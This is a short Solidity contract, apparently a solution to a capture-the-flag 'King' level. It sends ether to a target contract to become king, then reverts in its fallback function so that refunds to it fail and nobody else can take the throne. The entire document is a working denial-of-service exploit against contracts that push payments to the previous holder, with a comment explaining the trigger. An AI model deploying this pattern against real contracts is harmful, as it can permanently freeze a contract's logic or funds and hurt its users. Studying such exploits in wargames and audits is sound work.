// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attackKing {
    address payable king;

    constructor(address _address){
        king = payable(_address);
    }

    function attackingKing() payable public returns(bool) {
        (bool success, ) = king.call{value: msg.value}("");
        return success;
    }

    fallback() external payable {
        revert();
    }
}

// when the king contract sends back ether into this contract, the fallback function will be triggered.